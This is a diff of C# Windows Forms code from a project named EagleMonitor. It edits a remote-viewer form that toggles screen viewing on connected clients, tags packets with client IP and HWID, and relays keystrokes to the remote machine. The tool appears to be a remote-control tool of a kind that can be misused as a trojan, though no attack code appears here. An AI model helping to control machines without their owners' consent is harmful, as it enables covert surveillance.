@@ -6,7 +6,6 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 /* 
@@ -39,7 +38,7 @@ namespace EagleMonitor.Forms
             keysPressed = new List<Keys>();
         }
       
-        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
@@ -56,16 +55,18 @@ namespace EagleMonitor.Forms
 
                 this.loadingCircle1.Visible = true;
                 this.loadingCircle1.Active = true;
-
                 ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteViewerPacket);
             }
             else 
             {
                 this.loadingCircle1.Visible = false;
                 this.loadingCircle1.Active = false;
-                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
-                await Task.Run(() => this.clientHandler.SendPacket(remoteViewerPacket));
-                await Task.Run(() => this.clientHandler.Dispose());
+                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
+                {
+                    baseIp = this.baseIp,
+                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
+                };
+                this.clientHandler.SendPacket(remoteViewerPacket);
             }
         }
 
@@ -99,7 +100,6 @@ namespace EagleMonitor.Forms
                     quality = qualityGuna2TrackBar.Value,
                     timeMS = 1
                 };
-
                 this.clientHandler.SendPacket(remoteViewerPacket);
             }
         }
@@ -230,7 +230,6 @@ namespace EagleMonitor.Forms
             {
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
-
                 keysPressed.Remove(e.KeyCode);
                 this.clientHandler.SendPacket(new RemoteKeyboardPacket((byte)e.KeyCode, false));
             }
@@ -280,11 +279,12 @@ namespace EagleMonitor.Forms
 
         private void closeButton_Click(object sender, EventArgs e)
         {
-            if (captureGuna2ToggleSwitch.Checked || clientHandler != null)
+            if (captureGuna2ToggleSwitch.Checked)
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                 {
-                    baseIp = this.baseIp
+                    baseIp = this.baseIp,
+                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
                 };
                 this.clientHandler.SendPacket(remoteViewerPacket);
             }
